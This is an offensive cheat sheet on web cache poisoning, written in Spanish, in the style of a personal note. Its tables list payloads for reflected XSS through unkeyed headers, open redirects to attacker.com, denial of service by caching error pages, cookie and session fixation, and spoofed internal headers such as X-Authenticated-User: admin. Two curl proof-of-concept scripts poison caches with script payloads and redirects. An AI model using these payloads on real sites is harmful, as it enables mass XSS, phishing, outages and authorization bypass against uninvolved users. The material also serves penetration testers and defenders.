---
aliases:
  - Cache Poisoning XSS
  - Cache Poisoning DoS
  - Open Redirect Cache
  - Cookie Injection Cache
tags:
  - type/cheatsheet
  - vuln/cache-poisoning
  - technique/initial-access
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Web Cache Poisoning]]'
  - '[[Cross-Site Scripting (XSS)]]'
---
# Web Cache Poisoning - Vectores de Poisoning

***

## Reflected XSS via Unkeyed Header

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Header unkeyed reflejado en response cacheada → XSS persistente para todo user que reciba cache hit | High impact. |
| Header `X-Forwarded-Host` | `X-Forwarded-Host: <script>alert(1)</script>` reflejado en `<base href>` o canonical link | Common. |
| Header `Host` reflexion | `Host: target.com<script>alert(1)</script>` | Some apps reflejan literal Host. |
| User-Agent reflexion | `User-Agent: <script>alert(1)</script>` reflejado en `<meta>` | Less common. |
| Referer reflexion | `Referer: javascript:alert(1)` en links del page | If reflected. |
| Origin reflection | `Origin: https://attacker<script>...` en CORS headers | Edge. |
| `X-Original-Url` reflexión | Reflejado en logs / error pages | IIS. |
| Combine con cache hit | Trigger poisoning + lograr que apps subsiguientes hit | Window TTL. |
| TTL exploitation | Si cache TTL = 1 hora → todos los users hit por 1h | Persistencia. |
| Account takeover via XSS chain | Cache poison XSS → cookie theft → ATO | Standard chain. |
| Stored-effect XSS sin storage | Sin DB store, persiste por TTL | Quirk. |
| Self-XSS via cache poison | Atacante poisona su propia session cache | Useful for chaining. |
^wcp-vector-xss

### PoC reflected XSS via X-Forwarded-Host

```bash
# 1. Identificar header unkeyed que se refleja
URL="https://target/?cb=$(date +%s)"

# Probe normal
curl -s "$URL" | grep -i "<base href"
# <base href="https://target.com/">

# Probe con X-Forwarded-Host
curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" "$URL" | grep -i "<base href"
# <base href="https://<script>alert(1)</script>/">  ← reflejado

# 2. Confirmar unkeyed
URL2="https://target/?cb=$(date +%s)-poison"
# Poison
curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" "$URL2"
# Verify hit sin header
curl -s "$URL2" | grep -i "<base href"
# <base href="https://<script>...  ← cached!

# 3. Victims fetching $URL2 reciben XSS por TTL completo
```

___

## Open Redirect via Host / X-Forwarded-Host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | App usa `Host` o `X-Forwarded-Host` para construir redirect URLs (login flow, post-auth) → cache poison redirect | Phishing impact. |
| Header `X-Forwarded-Host: attacker.com` | App genera `Location: https://attacker.com/login` | Server-side redirect. |
| Internal API redirects | App redirects a internal admin URL → atacante alcanza | Internal exposure. |
| Login redirect chain | OAuth callback con Host injection | OAuth abuse. |
| 301/302 cached | Browsers cachean redirects strong | Persistencia client-side también. |
| Combine con HSTS | Cached HSTS redirect | Strict transport. |
| Cache attacker.com redirect | Todos los users cache hit → redirected al atacante | Mass impact. |
| Combine con SSRF detection | Redirect a localhost para SSRF | Combo. |
| Combine con XSS gadget | Redirect a `javascript:` URL en old browsers | Edge. |
| Subdomain takeover combo | Atacante controla subdomain → poisoned redirect | Chain. |
^wcp-vector-redirect

### PoC open redirect cache poison

```bash
URL="https://target/login?cb=$(date +%s)"

# Poison: Host injection a attacker.com
curl -s -H "X-Forwarded-Host: attacker.com" "$URL" -I | grep -i location
# Location: https://attacker.com/auth/callback?...

# Verify cached
curl -s "$URL" -I | grep -i location
# Location: https://attacker.com/...  ← persistente
```

___

## DoS via Cache Poisoning (404 / 500 Storm)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Forzar cache de error response (404/500) en URL legítima → all users reciben error | Denial of service masiva. |
| Cache 404 | Header malformado → backend retorna 404 → cached | "Resource not found" para todos. |
| Cache 500 | Trigger error con header maligno → 500 cacheado | "Server error" para todos. |
| Cache redirect loop | 302 → 302 → 302 cached | Browser bloquea. |
| Cache empty body | Backend retorna body vacío con header trick → cached | Página en blanco. |
| Cache misconfiguration MIME | Wrong Content-Type cached | Browsers no interpretan. |
| Cache CORS error | Wrong Access-Control headers cached | Cross-origin breaks. |
| Bulk poisoning | Loop de URLs poisoned simultáneamente | Site-wide DoS. |
| Path-specific DoS | Solo `/admin` cached con error → admin lockout | Targeted. |
| TTL extension | Refresh poison antes de TTL expire | Persistencia. |
^wcp-vector-dos

___

## Cookie Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Header `Set-Cookie` puede ser cacheado en algunas configs anómalas → cookie controlled servida a otros users | Session fixation cache. |
| Force Set-Cookie cached | Header maligno → backend Set-Cookie con value atacante | Cached response include Set-Cookie. |
| Session fixation via cache | Atacante login → cookie atacante → cached → forced en víctimas | Hijack flow. |
| Track cookie injection | `Set-Cookie: tracking=attacker_value` en cache | Reportable. |
| `_csrf` token poison | Cached fixed CSRF token en form | Predictable token. |
| Cache feature flags | Cookie con flag enable XSS gadget | Combo. |
| Mitigation defender | Caches modernos NO cachean Set-Cookie por default | Common defense. |
| Bypass via header strip | Cache que no strip Set-Cookie en certain paths | Misconfig. |
| Sub-tier cache | Cookies en intermediate cache (proxy interno) | Complex. |
^wcp-vector-cookie

___

## Internal Header Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Cache poison para inyectar headers internos que backend trustea | Chain con auth bypass. |
| `X-Forwarded-For: 127.0.0.1` | Backend trustea como local IP → admin features unlocked | Auth bypass. |
| `X-Real-IP: 10.0.0.5` | IP allowlist bypass | Internal. |
| `X-Authenticated-User: admin` | Auth header trusted | Privesc. |
| `X-Admin: true` | Custom flag | App-specific. |
| `X-Forwarded-Proto: https` | Force HTTPS interpretation | Security context. |
| `X-Original-Url: /admin` | Path rewrite | IIS. |
| `X-Tenant-Id: 1` | Multi-tenant escape | Lateral. |
| `X-Role: admin` | Role injection | Privesc. |
| Combine con header smuggling | HRS + cache poisoning | Multi-vector. |
^wcp-vector-internal

***
